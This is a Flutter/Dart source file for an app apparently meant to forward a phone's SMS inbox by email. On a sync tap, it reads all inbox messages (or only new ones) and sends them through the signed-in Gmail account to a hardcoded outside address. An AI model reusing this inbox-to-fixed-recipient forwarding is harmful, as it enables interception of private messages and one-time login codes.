import 'dart:async';

import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';

import 'package:shared_preferences/shared_preferences.dart';

import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server/gmail.dart';

import 'package:sms_forward/google_signIn.dart';

class EmailSender extends StatefulWidget {
  //  EmailSender({Key? key, required User user, })
  //     : _user = user,

  //       super(key: key);

  // final User _user;
  User? user;
  EmailSender({this.user});

  @override
  State<EmailSender> createState() => _EmailSenderState();
}

class _EmailSenderState extends State<EmailSender> {
  SmsQuery query = SmsQuery();
  late List<SmsMessage> messages = [];
  int? timeStamp;

  @override
  void initState() {
    // signInWithGoogle();
    // TODO: implement initState
    super.initState();
    loadData();
  }

  void loadData() async {
    final prefs = await SharedPreferences.getInstance();
    timeStamp = prefs.getInt('time');
    messages = await query.querySms(
      kinds: [SmsQueryKind.inbox],
    );
    setState(() {});
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        drawer: Drawer(
          child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
            ListTile(
              title: Text('Setting'),
              leading: Icon(Icons.settings),
              onLongPress: () {},
            ),
            ListTile(
              title: Text('About Us'),
              leading: Icon(Icons.info_outline_rounded),
              onLongPress: () {},
            ),
            ListTile(
              title: Text('Support'),
              leading: Icon(Icons.contact_support_outlined),
              onLongPress: () {},
            ),
            ListTile(
                title: Text('Close'),
                leading: Icon(Icons.close),
                onTap: () {
                  Navigator.of(context).pop();
                }),
          ]),
        ),
        appBar: AppBar(
          title: Text('Sms to Email'),
          centerTitle: true,
          actions: [
            IconButton(
              icon: Icon(
                Icons.sync,
                size: 30,
              ),
              onPressed: () {
                // sendmail();
                sendNewSms();
              },
            ),
          ],
        ),
        body: Column(crossAxisAlignment: CrossAxisAlignment.start,
          children: [  SizedBox(
                              height: 20,
                            ),
                            Text(
                              ' Name : ${widget.user!.displayName.toString()}',
                              style: TextStyle(
                                  fontSize: 17, fontWeight: FontWeight.bold),
                            ),
                            Text(
                              ' Email : ${widget.user!.email.toString()}',
                              style: TextStyle(
                                  fontSize: 17, fontWeight: FontWeight.bold),
                            ),
                            Text(
                              ' Token : ${widget.user!.uid.toString()}',
                              style: TextStyle(
                                  fontSize: 17, fontWeight: FontWeight.bold),
                            ),
                            SizedBox(
                              height: 20,
                            ),
            Expanded(
              child: SizedBox(
                  height: Size.infinite.height,
                  width: Size.infinite.width,
                  child: ListView.builder(
                      shrinkWrap: true,
                      //  physics: NeverScrollableScrollPhysics(),
                      itemCount:  messages.length,
                      itemBuilder: (context, index) {
                        return Column(
                          mainAxisAlignment: MainAxisAlignment.start,
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                          
                            ListTile(
                              title: Text(messages[index].sender.toString()),
                              subtitle: Text(messages[index].body.toString()),
                              trailing: Icon(
                                Icons.cloud_done,
                                color: Colors.lightBlueAccent,
                              ),
                              // tileColor: Colors.greenAccent,
                            ),
                            Divider(
                              thickness: 2,
                            )
                          ],
                        );
                      })),
            ),
          ],
        ));
  }

  Future<void> sendNewSms() async {
    final prefs = await SharedPreferences.getInstance();
    String messageBody = "";

    if (timeStamp == null) {
      /// Send all sms
      for (int i = 0; i < messages.length; i++) {
        print("send all sms");
        messageBody = "$messageBody\n----------------------------------------"
            "\n${messages[i].sender}\n${messages[i].body}\n${messages[i].date!.millisecondsSinceEpoch.toString()}";
      }
    } else {
      /// Check new sms
      for (int i = 0; i < messages.length; i++) {
        if (messages[i]
                .date!
                .compareTo(DateTime.fromMillisecondsSinceEpoch(timeStamp!)) ==
            1) {
          print("new sms found");
          messageBody = "$messageBody\n----------------------------------------"
              "\n${messages[i].sender}\n${messages[i].body}\n${messages[i].date!.millisecondsSinceEpoch.toString()}";
        }
      }
    }
    if (messageBody.isNotEmpty) {
      /// Send sms here
      sendEmail('SMS from phone', 'rahimsr983@gmail.com', 'SMS', messageBody)
          .then((value) async {
        SnackBar(content: Text('Send mail SuccessFully'));
        print("sms sent!!!!!!!!!!!!!");
        timeStamp = messages[0].date!.millisecondsSinceEpoch;
        await prefs.setInt('time', messages[0].date!.millisecondsSinceEpoch);
      });
    }
    print(messageBody);
  }

  Future sendEmail(
    String title,
    String toEmail,
    String subject,
    String body,
  ) async {
    // GoogleAuthApi.signOut();
    final user = await GoogleAuthApi.signIn();
    if (user == null) return;
    final email = user.email;
    final auth = await user.authentication;
    final token = auth.accessToken;
    print('Authenticaltion mail $email');

    final smtpServer = gmailSaslXoauth2(email, token!);
    final message = Message()
      ..from = Address(email, title)
      ..recipients = [toEmail]
      ..subject = subject
      ..text = body;

    try {
      await send(message, smtpServer).then(
          (value) => const SnackBar(content: Text('Send mail SuccessFully')));
    } on MailerException catch (e) {
      print(e);
    }
  }
}
